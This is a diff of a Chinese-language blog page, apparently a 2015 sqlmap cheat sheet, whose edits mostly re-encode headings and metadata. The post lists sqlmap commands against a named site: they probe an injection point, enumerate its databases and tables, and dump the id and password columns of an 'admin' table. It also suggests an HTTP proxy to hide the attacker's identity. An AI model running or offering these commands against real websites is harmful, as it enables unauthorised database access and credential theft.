@@ -86,19 +86,22 @@
 
 
 
-<meta name="description" content="&amp;#x68C0;&amp;#x67E5;&amp;#x6CE8;&amp;#x5165;&amp;#x70B9;1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11
-&amp;#x5217;&amp;#x6570;&amp;#x636E;&amp;#x5E93;&amp;#x4FE1;&amp;#x606F;1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id">
+<meta name="description" content="检查注入点1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11
+列数据库信息1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 --dbs
+指定库名列出所有表1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlmal-command">
 <meta property="og:url" content="https://asanzjx.github.io/2015/05/19/2015-05-19-sqlmal-command/index.html">
 <meta property="og:site_name" content="Asan'world">
-<meta property="og:description" content="&amp;#x68C0;&amp;#x67E5;&amp;#x6CE8;&amp;#x5165;&amp;#x70B9;1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11
-&amp;#x5217;&amp;#x6570;&amp;#x636E;&amp;#x5E93;&amp;#x4FE1;&amp;#x606F;1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id">
+<meta property="og:description" content="检查注入点1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11
+列数据库信息1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 --dbs
+指定库名列出所有表1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11">
 <meta property="og:updated_time" content="2016-08-18T07:00:02.837Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="sqlmal-command">
-<meta name="twitter:description" content="&amp;#x68C0;&amp;#x67E5;&amp;#x6CE8;&amp;#x5165;&amp;#x70B9;1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11
-&amp;#x5217;&amp;#x6570;&amp;#x636E;&amp;#x5E93;&amp;#x4FE1;&amp;#x606F;1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id">
+<meta name="twitter:description" content="检查注入点1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11
+列数据库信息1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 --dbs
+指定库名列出所有表1sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11">
 
 
 
@@ -322,11 +325,11 @@
       
 
       
-        <h3 id="&#x68C0;&#x67E5;&#x6CE8;&#x5165;&#x70B9;"><a href="#&#x68C0;&#x67E5;&#x6CE8;&#x5165;&#x70B9;" class="headerlink" title="&#x68C0;&#x67E5;&#x6CE8;&#x5165;&#x70B9;"></a>&#x68C0;&#x67E5;&#x6CE8;&#x5165;&#x70B9;</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11</span><br></pre></td></tr></table></figure>
-<h3 id="&#x5217;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;"><a href="#&#x5217;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;" class="headerlink" title="&#x5217;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;"></a>&#x5217;&#x6570;&#x636E;&#x5E93;&#x4FE1;&#x606F;</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 --dbs</span><br></pre></td></tr></table></figure>
-<h3 id="&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x8868;"><a href="#&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x8868;" class="headerlink" title="&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x8868;"></a>&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x8868;</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 --tables</span><br></pre></td></tr></table></figure>
-<h2 id="&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x5B57;&#x6BB5;"><a href="#&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x5B57;&#x6BB5;" class="headerlink" title="&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x5B57;&#x6BB5;"></a>&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5217;&#x51FA;&#x6240;&#x6709;&#x5B57;&#x6BB5;</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 -T admin --columns</span><br></pre></td></tr></table></figure>
-<h3 id="&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5B57;&#x6BB5;dump&#x51FA;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;"><a href="#&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5B57;&#x6BB5;dump&#x51FA;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;" class="headerlink" title="&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5B57;&#x6BB5;dump&#x51FA;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;"></a>&#x6307;&#x5B9A;&#x5E93;&#x540D;&#x8868;&#x540D;&#x5B57;&#x6BB5;dump&#x51FA;&#x6307;&#x5B9A;&#x5B57;&#x6BB5;</h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 -T admin -C ac,id,password --dump </span><br><span class="line">--cookie=COOKIE //&#x5728;&#x9700;&#x8981;&#x767B;&#x5F55;&#x7684;&#x5730;&#x65B9;&#xFF0C;&#x9700;&#x8981;&#x767B;&#x5F55;&#x540E;&#x7684;cookie </span><br><span class="line">--proxy=<span class="string">&quot;http://127.0.0.1:8087&quot;</span>&#xA0;&#x4F7F;&#x7528;HTTP&#x4EE3;&#x7406;&#x9690;&#x85CF;&#x81EA;&#x5DF1;&#x7684;&#x8EAB;&#x4EFD;&#xFF0C;&#x6BD4;&#x5982;&#x4F7F;&#x7528;goagent&#x7B49;</span><br><span class="line"></span><br><span class="line">--sql-query=QUERY &#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#xA0;&#x6267;&#x884C;&#x4E00;&#x4E2A;sql&#x8BED;&#x53E5;&#xFF0C;&#x4E0D;&#x4E00;&#x5B9A;&#x652F;&#x6301;</span><br><span class="line"></span><br><span class="line">.\sqlmapproject-sqlmap-17bfda1</span><br></pre></td></tr></table></figure>
+        <h3><span id="检查注入点">检查注入点</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11</span><br></pre></td></tr></table></figure>
+<h3><span id="列数据库信息">列数据库信息</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 --dbs</span><br></pre></td></tr></table></figure>
+<h3><span id="指定库名列出所有表">指定库名列出所有表</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 --tables</span><br></pre></td></tr></table></figure>
+<h2><span id="指定库名表名列出所有字段">指定库名表名列出所有字段</span></h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 -T admin --columns</span><br></pre></td></tr></table></figure>
+<h3><span id="指定库名表名字段dump出指定字段">指定库名表名字段dump出指定字段</span></h3><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://ooxx.com.tw/star_photo.php?artist_id=11 -D vhost48330 -T admin -C ac,id,password --dump </span><br><span class="line">--cookie=COOKIE //在需要登录的地方，需要登录后的cookie </span><br><span class="line">--proxy=<span class="string">"http://127.0.0.1:8087"</span> 使用HTTP代理隐藏自己的身份，比如使用goagent等</span><br><span class="line"></span><br><span class="line">--sql-query=QUERY               执行一个sql语句，不一定支持</span><br><span class="line"></span><br><span class="line">.\sqlmapproject-sqlmap-17bfda1</span><br></pre></td></tr></table></figure>
       
     </div>
 
@@ -494,7 +497,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#检查注入点"><span class="nav-number">1.</span> <span class="nav-text">检查注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#列数据库信息"><span class="nav-number">2.</span> <span class="nav-text">列数据库信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名列出所有表"><span class="nav-number">3.</span> <span class="nav-text">指定库名列出所有表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#指定库名表名列出所有字段"><span class="nav-number"></span> <span class="nav-text">指定库名表名列出所有字段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#指定库名表名字段dump出指定字段"><span class="nav-number">1.</span> <span class="nav-text">指定库名表名字段dump出指定字段</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">检查注入点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">2.</span> <span class="nav-text">列数据库信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">3.</span> <span class="nav-text">指定库名列出所有表</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#undefined"><span class="nav-number"></span> <span class="nav-text">指定库名表名列出所有字段</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#undefined"><span class="nav-number">1.</span> <span class="nav-text">指定库名表名字段dump出指定字段</span></a></li></ol></div>
             
           </div>
         </section>
